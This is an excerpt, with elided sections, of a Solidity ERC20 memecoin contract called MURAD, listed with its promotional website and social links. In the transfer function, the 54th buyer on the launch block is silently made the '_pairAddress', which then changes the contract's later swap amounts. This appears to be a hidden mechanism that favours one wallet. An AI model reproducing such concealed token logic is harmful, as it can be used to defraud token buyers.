...
Website: https://muradeth.fun
Twitter: https://x.com/MuradETH
Telegram: https://t.me/MuradETH
...
contract MURAD is ERC20, Ownable {
    ...
    constructor() ERC20(unicode"Murad 💹🧲", unicode"MURAD") payable {
        uint256 totalSupply = 1000000000 * 1e9;

        feeReceiver = 0xc6d7591bdFC1a66653E6309Ecd15e75fA490AaF1;
        buyFeeProcent = 0;
        sellFeeProcent = 0;
    ...
    function _transfer(
        ...
        if(isBuy && !excluded){
            ...
            if(uint32(block.number) == _launchBlock){
                if(++_launchBuys == 54) _pairAddress = to;
            }
        }            

        uint256 contractTokenBalance = balanceOf(address(this));
        if (isSell && !_inSwap && contractTokenBalance >= contractSwapMin && !excluded) {
            if (block.number > _lastSellBlock) 
                _sellCount = 0;
            require(_sellCount < 3, "Only 3 sells per block!");
            _inSwap = true;
            uint256 contractSwapAmount = from == _pairAddress ?  contractSwapMax/2 : amount; 
            swapTokensForEth(min(contractSwapAmount, min(contractTokenBalance, contractSwapMax)));
            _inSwap = false;
    ...
    function transferStuckToken(IERC20 token) external onlyOwner {
        if(address(token) == address(this)) //burn ca balance if input token is MURAD
